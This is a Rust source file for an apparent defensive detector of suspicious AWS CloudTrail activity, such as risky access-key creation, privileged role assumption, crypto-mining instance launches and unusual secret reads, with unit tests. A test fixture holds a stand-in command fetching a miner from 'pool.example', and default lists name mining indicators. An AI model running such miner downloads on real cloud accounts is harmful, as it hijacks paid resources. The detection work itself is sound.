use crate::detector::{
    CloudTrailEvent, DetectionFinding, DetectionStrategy, TelemetryEvent, TelemetryPayload,
};
use crate::{ProfileValidationError, validate_confidence_thresholds};
use serde::{Deserialize, Serialize};
use serde_json::{Map, Value, json};
use std::collections::{HashMap, HashSet};
use std::sync::{Arc, Mutex};
use swarm_core::pheromone::ThreatClass;
use swarm_core::types::Severity;

#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct CloudTrailProfile {
    #[serde(default = "default_privileged_role_fragments")]
    pub privileged_role_fragments: Vec<String>,
    #[serde(default = "default_mining_indicator_fragments")]
    pub mining_indicator_fragments: Vec<String>,
    #[serde(default = "default_large_instance_prefixes")]
    pub large_instance_prefixes: Vec<String>,
    #[serde(default = "default_high_confidence_threshold")]
    pub high_confidence_threshold: f64,
    #[serde(default = "default_medium_confidence_threshold")]
    pub medium_confidence_threshold: f64,
}

impl Default for CloudTrailProfile {
    fn default() -> Self {
        Self {
            privileged_role_fragments: default_privileged_role_fragments(),
            mining_indicator_fragments: default_mining_indicator_fragments(),
            large_instance_prefixes: default_large_instance_prefixes(),
            high_confidence_threshold: default_high_confidence_threshold(),
            medium_confidence_threshold: default_medium_confidence_threshold(),
        }
    }
}

#[derive(Debug, Default)]
struct CloudTrailState {
    console_login_ips_by_principal: HashMap<String, HashSet<String>>,
    instance_types_by_principal: HashMap<String, HashSet<String>>,
    secret_callers_by_resource: HashMap<String, HashSet<String>>,
}

#[derive(Debug, Clone)]
pub struct CloudTrailDetector {
    privileged_role_fragments: Vec<String>,
    mining_indicator_fragments: Vec<String>,
    large_instance_prefixes: Vec<String>,
    high_confidence_threshold: f64,
    medium_confidence_threshold: f64,
    state: Arc<Mutex<CloudTrailState>>,
}

impl Default for CloudTrailDetector {
    fn default() -> Self {
        Self {
            privileged_role_fragments: default_privileged_role_fragments()
                .into_iter()
                .map(normalize)
                .collect(),
            mining_indicator_fragments: default_mining_indicator_fragments()
                .into_iter()
                .map(normalize)
                .collect(),
            large_instance_prefixes: default_large_instance_prefixes()
                .into_iter()
                .map(normalize)
                .collect(),
            high_confidence_threshold: default_high_confidence_threshold(),
            medium_confidence_threshold: default_medium_confidence_threshold(),
            state: Arc::default(),
        }
    }
}

impl CloudTrailDetector {
    pub fn from_profile(profile: CloudTrailProfile) -> Result<Self, ProfileValidationError> {
        profile.validate()?;
        Ok(Self {
            privileged_role_fragments: profile
                .privileged_role_fragments
                .into_iter()
                .map(normalize)
                .collect(),
            mining_indicator_fragments: profile
                .mining_indicator_fragments
                .into_iter()
                .map(normalize)
                .collect(),
            large_instance_prefixes: profile
                .large_instance_prefixes
                .into_iter()
                .map(normalize)
                .collect(),
            high_confidence_threshold: profile.high_confidence_threshold,
            medium_confidence_threshold: profile.medium_confidence_threshold,
            state: Arc::default(),
        })
    }

    pub fn profile(&self) -> CloudTrailProfile {
        CloudTrailProfile {
            privileged_role_fragments: self.privileged_role_fragments.clone(),
            mining_indicator_fragments: self.mining_indicator_fragments.clone(),
            large_instance_prefixes: self.large_instance_prefixes.clone(),
            high_confidence_threshold: self.high_confidence_threshold,
            medium_confidence_threshold: self.medium_confidence_threshold,
        }
    }

    fn evaluate_cloudtrail(
        &self,
        event: &TelemetryEvent,
        cloudtrail: &CloudTrailEvent,
    ) -> Vec<DetectionFinding> {
        if cloudtrail.error_code.is_some() {
            return Vec::new();
        }

        let event_name = normalize(&cloudtrail.event_name);
        let principal = principal_key(cloudtrail);
        let mut findings = Vec::new();

        if event_name == "createaccesskey" && self.create_access_key_unusual_principal(cloudtrail) {
            findings.push(self.finding(
                event,
                cloudtrail,
                "create_access_key_unusual_principal",
                ThreatClass::Persistence,
                Severity::High,
                self.high_confidence_threshold,
                "T1098",
                "Account Manipulation",
                "persistence",
                json!({
                    "principal_type": cloudtrail.principal_type,
                }),
            ));
        }

        if event_name == "consolelogin"
            && cloudtrail.mfa_authenticated == Some(false)
            && self.console_login_from_new_ip(&principal, cloudtrail.source_ip_address.as_deref())
        {
            findings.push(self.finding(
                event,
                cloudtrail,
                "console_login_without_mfa_from_new_ip",
                ThreatClass::InitialAccess,
                Severity::High,
                self.high_confidence_threshold,
                "T1078.004",
                "Valid Accounts: Cloud Accounts",
                "initial-access",
                json!({}),
            ));
        }

        if event_name == "assumerole" && self.assume_role_to_privileged_role(cloudtrail) {
            findings.push(self.finding(
                event,
                cloudtrail,
                "assume_role_to_privileged_role",
                ThreatClass::PrivilegeEscalation,
                Severity::Critical,
                self.high_confidence_threshold,
                "T1078.004",
                "Valid Accounts: Cloud Accounts",
                "privilege-escalation",
                json!({
                    "requested_role_arn": json_string_pointer(&cloudtrail.request_parameters, "/roleArn"),
                }),
            ));
        }

        if event_name == "runinstances" && self.run_instances_with_mining_indicators(cloudtrail) {
            findings.push(self.finding(
                event,
                cloudtrail,
                "run_instances_crypto_mining_pattern",
                ThreatClass::Impact,
                Severity::Critical,
                self.high_confidence_threshold,
                "T1496",
                "Resource Hijacking",
                "impact",
                json!({
                    "instance_type": json_string_pointer(&cloudtrail.request_parameters, "/instanceType"),
                    "image_id": json_string_pointer(&cloudtrail.request_parameters, "/imageId"),
                }),
            ));
        }

        if event_name == "runinstances"
            && self.run_instances_large_instance_from_unusual_principal(&principal, cloudtrail)
        {
            findings.push(self.finding(
                event,
                cloudtrail,
                "run_instances_large_instance_unusual_principal",
                ThreatClass::Impact,
                Severity::High,
                self.medium_confidence_threshold.max(0.82),
                "T1496",
                "Resource Hijacking",
                "impact",
                json!({
                    "instance_type": json_string_pointer(&cloudtrail.request_parameters, "/instanceType"),
                }),
            ));
        }

        if event_name == "getsecretvalue"
            && self.unusual_secret_caller(
                &principal,
                json_string_pointer(&cloudtrail.request_parameters, "/secretId").as_deref(),
            )
        {
            findings.push(self.finding(
                event,
                cloudtrail,
                "secret_read_by_unusual_caller",
                ThreatClass::CredentialAccess,
                Severity::High,
                self.high_confidence_threshold,
                "T1552",
                "Unsecured Credentials",
                "credential-access",
                json!({
                    "secret_id": json_string_pointer(&cloudtrail.request_parameters, "/secretId"),
                }),
            ));
        }

        if event_name == "getparameter"
            && self.unusual_secret_caller(
                &principal,
                json_string_pointer(&cloudtrail.request_parameters, "/name").as_deref(),
            )
        {
            findings.push(self.finding(
                event,
                cloudtrail,
                "parameter_read_by_unusual_caller",
                ThreatClass::CredentialAccess,
                Severity::High,
                self.high_confidence_threshold,
                "T1552",
                "Unsecured Credentials",
                "credential-access",
                json!({
                    "parameter_name": json_string_pointer(&cloudtrail.request_parameters, "/name"),
                }),
            ));
        }

        self.record_baselines(cloudtrail);
        findings
    }

    #[allow(clippy::too_many_arguments)]
    fn finding(
        &self,
        event: &TelemetryEvent,
        cloudtrail: &CloudTrailEvent,
        mode: &str,
        threat_class: ThreatClass,
        severity: Severity,
        confidence: f64,
        technique_id: &str,
        technique_name: &str,
        kill_chain_stage: &str,
        extra: Value,
    ) -> DetectionFinding {
        let mut evidence = Map::new();
        evidence.insert("event_name".to_string(), json!(cloudtrail.event_name));
        evidence.insert("event_source".to_string(), json!(cloudtrail.event_source));
        evidence.insert(
            "aws_account_id".to_string(),
            json!(cloudtrail.aws_account_id),
        );
        evidence.insert("principal_arn".to_string(), json!(cloudtrail.principal_arn));
        evidence.insert("principal_id".to_string(), json!(cloudtrail.principal_id));
        evidence.insert(
            "principal_name".to_string(),
            json!(cloudtrail.principal_name),
        );
        evidence.insert(
            "principal_type".to_string(),
            json!(cloudtrail.principal_type),
        );
        evidence.insert(
            "source_ip_address".to_string(),
            json!(cloudtrail.source_ip_address),
        );
        evidence.insert("aws_region".to_string(), json!(cloudtrail.aws_region));
        evidence.insert("user_agent".to_string(), json!(cloudtrail.user_agent));
        evidence.insert(
            "request_parameters".to_string(),
            cloudtrail.request_parameters.clone(),
        );
        evidence.insert(
            "response_elements".to_string(),
            cloudtrail.response_elements.clone(),
        );
        evidence.insert("mode".to_string(), json!(mode));
        evidence.insert("mitre_technique_id".to_string(), json!(technique_id));
        evidence.insert(
            "attack_techniques".to_string(),
            json!([{
                "id": technique_id,
                "name": technique_name,
                "kill_chain_stage": kill_chain_stage,
            }]),
        );
        if let Value::Object(extra) = extra {
            evidence.extend(extra);
        }

        DetectionFinding {
            finding_id: format!("{}:{}:{}", self.id(), mode, event.event_id),
            event_id: event.event_id.clone(),
            threat_class,
            severity,
            confidence,
            evidence: Value::Object(evidence),
            strategy_id: self.id().to_string(),
        }
    }

    fn create_access_key_unusual_principal(&self, cloudtrail: &CloudTrailEvent) -> bool {
        let principal_type = cloudtrail
            .principal_type
            .as_deref()
            .map(normalize)
            .unwrap_or_default();
        let principal_arn = cloudtrail
            .principal_arn
            .as_deref()
            .map(normalize)
            .unwrap_or_default();
        principal_type != "iamuser"
            || principal_arn.contains(":assumed-role/")
            || principal_arn.starts_with("arn:aws:sts::")
    }

    fn console_login_from_new_ip(&self, principal: &str, source_ip: Option<&str>) -> bool {
        let Some(source_ip) = source_ip.map(normalize).filter(|value| !value.is_empty()) else {
            return false;
        };
        let mut guard = self
            .state
            .lock()
            .unwrap_or_else(|poison| poison.into_inner());
        let seen = guard
            .console_login_ips_by_principal
            .entry(principal.to_string())
            .or_default();
        let prior_non_empty = !seen.is_empty();
        let inserted = seen.insert(source_ip);
        prior_non_empty && inserted
    }

    fn assume_role_to_privileged_role(&self, cloudtrail: &CloudTrailEvent) -> bool {
        json_string_pointer(&cloudtrail.request_parameters, "/roleArn")
            .map(|value| normalize(&value))
            .is_some_and(|role_arn| {
                self.privileged_role_fragments
                    .iter()
                    .any(|fragment| role_arn.contains(fragment))
            })
    }

    fn run_instances_with_mining_indicators(&self, cloudtrail: &CloudTrailEvent) -> bool {
        json_tree_contains_fragments(
            &cloudtrail.request_parameters,
            &self.mining_indicator_fragments,
        ) || json_tree_contains_fragments(
            &cloudtrail.response_elements,
            &self.mining_indicator_fragments,
        )
    }

    fn run_instances_large_instance_from_unusual_principal(
        &self,
        principal: &str,
        cloudtrail: &CloudTrailEvent,
    ) -> bool {
        let Some(instance_type) =
            json_string_pointer(&cloudtrail.request_parameters, "/instanceType")
                .map(normalize)
                .filter(|value| {
                    self.large_instance_prefixes
                        .iter()
                        .any(|prefix| value.starts_with(prefix))
                })
        else {
            return false;
        };
        let mut guard = self
            .state
            .lock()
            .unwrap_or_else(|poison| poison.into_inner());
        let seen = guard
            .instance_types_by_principal
            .entry(principal.to_string())
            .or_default();
        let prior_non_empty = !seen.is_empty();
        let inserted = seen.insert(instance_type);
        prior_non_empty && inserted
    }

    fn unusual_secret_caller(&self, principal: &str, resource: Option<&str>) -> bool {
        let Some(resource) = resource.map(normalize).filter(|value| !value.is_empty()) else {
            return false;
        };
        let mut guard = self
            .state
            .lock()
            .unwrap_or_else(|poison| poison.into_inner());
        let seen = guard
            .secret_callers_by_resource
            .entry(resource)
            .or_default();
        let prior_non_empty = !seen.is_empty();
        let inserted = seen.insert(principal.to_string());
        prior_non_empty && inserted
    }

    fn record_baselines(&self, cloudtrail: &CloudTrailEvent) {
        let principal = principal_key(cloudtrail);
        let event_name = normalize(&cloudtrail.event_name);
        let mut guard = self
            .state
            .lock()
            .unwrap_or_else(|poison| poison.into_inner());
        if event_name == "consolelogin"
            && let Some(source_ip) = cloudtrail.source_ip_address.as_deref()
        {
            guard
                .console_login_ips_by_principal
                .entry(principal.clone())
                .or_default()
                .insert(normalize(source_ip));
        }
        if event_name == "runinstances"
            && let Some(instance_type) =
                json_string_pointer(&cloudtrail.request_parameters, "/instanceType")
        {
            guard
                .instance_types_by_principal
                .entry(principal.clone())
                .or_default()
                .insert(normalize(&instance_type));
        }
        if event_name == "getsecretvalue"
            && let Some(resource) = json_string_pointer(&cloudtrail.request_parameters, "/secretId")
        {
            guard
                .secret_callers_by_resource
                .entry(normalize(&resource))
                .or_default()
                .insert(principal.clone());
        }
        if event_name == "getparameter"
            && let Some(resource) = json_string_pointer(&cloudtrail.request_parameters, "/name")
        {
            guard
                .secret_callers_by_resource
                .entry(normalize(&resource))
                .or_default()
                .insert(principal.clone());
        }
    }
}

impl CloudTrailProfile {
    pub fn validate(&self) -> Result<(), ProfileValidationError> {
        validate_confidence_thresholds(
            "cloudtrail",
            self.high_confidence_threshold,
            self.medium_confidence_threshold,
        )?;
        validate_entries(
            "cloudtrail",
            "privileged_role_fragments",
            &self.privileged_role_fragments,
        )?;
        validate_entries(
            "cloudtrail",
            "mining_indicator_fragments",
            &self.mining_indicator_fragments,
        )?;
        validate_entries(
            "cloudtrail",
            "large_instance_prefixes",
            &self.large_instance_prefixes,
        )?;
        Ok(())
    }
}

impl DetectionStrategy for CloudTrailDetector {
    fn as_any(&self) -> &dyn std::any::Any {
        self
    }

    fn id(&self) -> &str {
        "cloudtrail"
    }

    fn evaluate(&self, event: &TelemetryEvent) -> Vec<DetectionFinding> {
        match &event.payload {
            TelemetryPayload::CloudTrail(cloudtrail) => self.evaluate_cloudtrail(event, cloudtrail),
            TelemetryPayload::ProcessStart(_)
            | TelemetryPayload::ProcessMemoryAccess(_)
            | TelemetryPayload::NetworkConnect(_)
            | TelemetryPayload::DnsQuery(_)
            | TelemetryPayload::KubernetesAudit(_)
            | TelemetryPayload::RegistryAccess(_)
            | TelemetryPayload::RegistryPersistence(_)
            | TelemetryPayload::FilePersistence(_)
            | TelemetryPayload::AuthenticationEvent(_)
            | TelemetryPayload::InfrastructureHealth(_)
            | TelemetryPayload::ThermalAnomaly(_)
            | TelemetryPayload::ResourceExhaustion(_) => Vec::new(),
        }
    }
}

fn validate_entries(
    profile: &'static str,
    field: &'static str,
    values: &[String],
) -> Result<(), ProfileValidationError> {
    if values.iter().any(|value| value.trim().is_empty()) {
        return Err(ProfileValidationError {
            profile,
            field,
            reason: "must not contain empty entries".to_string(),
        });
    }
    Ok(())
}

fn principal_key(cloudtrail: &CloudTrailEvent) -> String {
    cloudtrail
        .principal_arn
        .as_deref()
        .or(cloudtrail.principal_id.as_deref())
        .or(cloudtrail.principal_name.as_deref())
        .map(normalize)
        .filter(|value| !value.is_empty())
        .unwrap_or_else(|| "unknown".to_string())
}

fn json_string_pointer(root: &Value, pointer: &str) -> Option<String> {
    match root.pointer(pointer) {
        Some(Value::String(value)) => Some(value.to_string()),
        Some(Value::Number(value)) => Some(value.to_string()),
        Some(Value::Bool(value)) => Some(value.to_string()),
        _ => None,
    }
}

fn json_tree_contains_fragments(root: &Value, fragments: &[String]) -> bool {
    match root {
        Value::String(value) => {
            let value = normalize(value);
            fragments.iter().any(|fragment| value.contains(fragment))
        }
        Value::Array(values) => values
            .iter()
            .any(|value| json_tree_contains_fragments(value, fragments)),
        Value::Object(values) => values
            .values()
            .any(|value| json_tree_contains_fragments(value, fragments)),
        _ => false,
    }
}

fn normalize(value: impl AsRef<str>) -> String {
    value.as_ref().trim().to_ascii_lowercase()
}

fn default_privileged_role_fragments() -> Vec<String> {
    vec![
        "admin".to_string(),
        "administrator".to_string(),
        "poweruser".to_string(),
        "organizationaccountaccessrole".to_string(),
    ]
}

fn default_mining_indicator_fragments() -> Vec<String> {
    vec![
        "xmrig".to_string(),
        "miner".to_string(),
        "stratum+tcp".to_string(),
        "pool".to_string(),
    ]
}

fn default_large_instance_prefixes() -> Vec<String> {
    vec![
        "p4".to_string(),
        "p5".to_string(),
        "g5".to_string(),
        "g6".to_string(),
        "trn".to_string(),
    ]
}

fn default_high_confidence_threshold() -> f64 {
    0.95
}

fn default_medium_confidence_threshold() -> f64 {
    0.80
}

#[cfg(test)]
#[allow(clippy::expect_used, clippy::unwrap_used)]
mod tests {
    use super::{CloudTrailDetector, CloudTrailProfile};
    use crate::detector::{CloudTrailEvent, DetectionStrategy, TelemetryEvent, TelemetryPayload};
    use serde_json::json;
    use swarm_core::pheromone::ThreatClass;

    fn event(event_id: &str, principal_arn: &str, event_name: &str) -> TelemetryEvent {
        TelemetryEvent {
            source: "cloudtrail".to_string(),
            event_id: event_id.to_string(),
            timestamp: 1_760_000_000,
            host_id: Some("123456789012".to_string()),
            payload: TelemetryPayload::CloudTrail(CloudTrailEvent {
                event_name: event_name.to_string(),
                event_source: "iam.amazonaws.com".to_string(),
                aws_account_id: Some("123456789012".to_string()),
                principal_arn: Some(principal_arn.to_string()),
                principal_id: Some("AIDAEXAMPLE".to_string()),
                principal_name: Some("alice".to_string()),
                principal_type: Some("IAMUser".to_string()),
                source_ip_address: Some("203.0.113.10".to_string()),
                aws_region: Some("us-east-1".to_string()),
                user_agent: Some("aws-cli".to_string()),
                mfa_authenticated: Some(true),
                request_parameters: json!({}),
                response_elements: json!({}),
                error_code: None,
                error_message: None,
            }),
        }
    }

    #[test]
    fn create_access_key_from_assumed_role_is_detected() {
        let detector = CloudTrailDetector::default();
        let mut event = event(
            "evt-1",
            "arn:aws:sts::123456789012:assumed-role/build-role/session",
            "CreateAccessKey",
        );
        payload_mut(&mut event).principal_type = Some("AssumedRole".to_string());

        let findings = detector.evaluate(&event);
        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].threat_class, ThreatClass::Persistence);
        assert_eq!(
            findings[0].evidence["mode"],
            "create_access_key_unusual_principal"
        );
    }

    #[test]
    fn console_login_without_mfa_from_new_ip_is_detected_after_baseline() {
        let detector = CloudTrailDetector::default();
        let baseline = event(
            "evt-baseline",
            "arn:aws:iam::123456789012:user/alice",
            "ConsoleLogin",
        );
        assert!(detector.evaluate(&baseline).is_empty());

        let mut second = event(
            "evt-2",
            "arn:aws:iam::123456789012:user/alice",
            "ConsoleLogin",
        );
        payload_mut(&mut second).source_ip_address = Some("198.51.100.44".to_string());
        payload_mut(&mut second).mfa_authenticated = Some(false);

        let findings = detector.evaluate(&second);
        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].threat_class, ThreatClass::InitialAccess);
        assert_eq!(
            findings[0].evidence["mode"],
            "console_login_without_mfa_from_new_ip"
        );
    }

    #[test]
    fn privileged_assume_role_is_detected() {
        let detector = CloudTrailDetector::default();
        let mut event = event(
            "evt-3",
            "arn:aws:iam::123456789012:user/alice",
            "AssumeRole",
        );
        payload_mut(&mut event).request_parameters =
            json!({ "roleArn": "arn:aws:iam::123456789012:role/OrganizationAccountAccessRole" });

        let findings = detector.evaluate(&event);
        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].threat_class, ThreatClass::PrivilegeEscalation);
    }

    #[test]
    fn mining_run_instances_is_detected() {
        let detector = CloudTrailDetector::default();
        let mut event = event(
            "evt-4",
            "arn:aws:iam::123456789012:user/alice",
            "RunInstances",
        );
        payload_mut(&mut event).request_parameters = json!({
            "imageId": "ami-evilminer",
            "instanceType": "c5.large",
            "userData": "curl https://pool.example/xmrig"
        });

        let findings = detector.evaluate(&event);
        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].threat_class, ThreatClass::Impact);
    }

    #[test]
    fn large_instance_from_unusual_principal_is_detected_after_baseline() {
        let detector = CloudTrailDetector::default();
        let mut baseline = event(
            "evt-5a",
            "arn:aws:iam::123456789012:user/alice",
            "RunInstances",
        );
        payload_mut(&mut baseline).request_parameters = json!({ "instanceType": "t3.medium" });
        assert!(detector.evaluate(&baseline).is_empty());

        let mut second = event(
            "evt-5b",
            "arn:aws:iam::123456789012:user/alice",
            "RunInstances",
        );
        payload_mut(&mut second).request_parameters = json!({ "instanceType": "p4d.24xlarge" });
        let findings = detector.evaluate(&second);
        assert_eq!(findings.len(), 1);
        assert_eq!(
            findings[0].evidence["mode"],
            "run_instances_large_instance_unusual_principal"
        );
    }

    #[test]
    fn unusual_secret_and_parameter_callers_are_detected() {
        let detector = CloudTrailDetector::default();
        let mut baseline = event(
            "evt-6a",
            "arn:aws:iam::123456789012:user/alice",
            "GetSecretValue",
        );
        payload_mut(&mut baseline).request_parameters = json!({ "secretId": "prod/db-password" });
        assert!(detector.evaluate(&baseline).is_empty());

        let mut second = event(
            "evt-6b",
            "arn:aws:iam::123456789012:role/analytics",
            "GetSecretValue",
        );
        payload_mut(&mut second).principal_name = Some("analytics".to_string());
        payload_mut(&mut second).request_parameters = json!({ "secretId": "prod/db-password" });
        let findings = detector.evaluate(&second);
        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].threat_class, ThreatClass::CredentialAccess);

        let mut param_baseline = event(
            "evt-6c",
            "arn:aws:iam::123456789012:user/alice",
            "GetParameter",
        );
        payload_mut(&mut param_baseline).request_parameters = json!({ "name": "/prod/api-token" });
        assert!(detector.evaluate(&param_baseline).is_empty());

        let mut param_second = event(
            "evt-6d",
            "arn:aws:iam::123456789012:role/analytics",
            "GetParameter",
        );
        payload_mut(&mut param_second).principal_name = Some("analytics".to_string());
        payload_mut(&mut param_second).request_parameters = json!({ "name": "/prod/api-token" });
        let findings = detector.evaluate(&param_second);
        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].threat_class, ThreatClass::CredentialAccess);
    }

    fn payload_mut(event: &mut TelemetryEvent) -> &mut CloudTrailEvent {
        match &mut event.payload {
            TelemetryPayload::CloudTrail(payload) => payload,
            _ => panic!("expected cloudtrail payload"),
        }
    }

    #[test]
    fn profile_rejects_empty_fragments() {
        let error = CloudTrailDetector::from_profile(CloudTrailProfile {
            privileged_role_fragments: vec![" ".to_string()],
            ..CloudTrailProfile::default()
        })
        .expect_err("empty fragments should fail");
        assert!(error.to_string().contains("must not contain empty entries"));
    }
}
